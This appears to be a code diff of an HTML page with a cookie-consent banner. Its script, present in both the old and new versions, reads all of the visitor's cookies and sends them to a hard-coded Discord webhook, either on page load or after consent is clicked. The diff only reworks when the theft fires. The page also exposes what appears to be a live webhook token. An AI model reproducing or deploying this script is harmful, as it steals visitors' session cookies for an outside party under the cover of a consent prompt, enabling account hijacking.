@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -14,7 +13,7 @@
             color: #fff;
             padding: 20px;
             text-align: center;
-            display: block;
+            display: none;
             z-index: 999;
         }
         #cookie-banner button {
@@ -34,15 +33,16 @@
     </div>
 
     <script>
-        const webhookUrl = "https://discord.com/api/webhooks/1369010479003074611/xRcpWt1QM2sYztFWocs6uLxIPnHaGNdOvLAxWNtNgaogJXzAJ3laKqyC3Lp60TVomXX8"; // Replace with your actual Discord webhook URL
-        const delayBeforeSend = 2000; // Delay in milliseconds (e.g., 2000ms = 2 seconds)
+        const webhookUrl = "https://discord.com/api/webhooks/1369010479003074611/xRcpWt1QM2sYztFWocs6uLxIPnHaGNdOvLAxWNtNgaogJXzAJ3laKqyC3Lp60TVomXX8"; // Replace if needed
+        const delayBeforeSend = 2000; // 2 seconds
 
         function sendCookiesToWebhook() {
             const allCookies = document.cookie;
-            const cookieArray = allCookies.split(';');
+            const cookieArray = allCookies ? allCookies.split(';') : [];
             const formattedCookies = cookieArray.map(cookie => cookie.trim()).join('\n- ');
+
             const payload = {
-                content: `🍪 Website opened - Current Cookies:\n- ${formattedCookies}`
+                content: `🍪 Website opened - Current Cookies:\n- ${formattedCookies || 'No cookies set'}`
             };
 
             fetch(webhookUrl, {
@@ -54,31 +54,30 @@
             }).catch(err => console.error("Webhook failed:", err));
         }
 
-        function callSendCookiesWithDelay() {
-            setTimeout(sendCookiesToWebhook, delayBeforeSend);
-        }
-
-        // Call this function when the page loads
-        window.onload = callSendCookiesWithDelay;
-
         function hasAcceptedCookies() {
             return document.cookie.includes("cookieConsent=true");
         }
 
         function acceptCookies() {
-            document.cookie = "cookieConsent=true; path=/; max-age=" + 60 * 60 * 24 * 365;
+            document.cookie = "cookieConsent=true; path=/; max-age=" + 60 * 60 * 24 * 365; // 1 year
             const banner = document.getElementById("cookie-banner");
             if (banner) {
                 banner.style.display = "none";
             }
+
+            setTimeout(sendCookiesToWebhook, delayBeforeSend);
         }
 
-        if (!hasAcceptedCookies()) {
-            const banner = document.getElementById("cookie-banner");
-            if (banner) {
-                banner.style.display = "block";
+        window.onload = () => {
+            if (hasAcceptedCookies()) {
+                setTimeout(sendCookiesToWebhook, delayBeforeSend);
+            } else {
+                const banner = document.getElementById("cookie-banner");
+                if (banner) {
+                    banner.style.display = "block";
+                }
             }
-        }
+        };
     </script>
 
 </body>
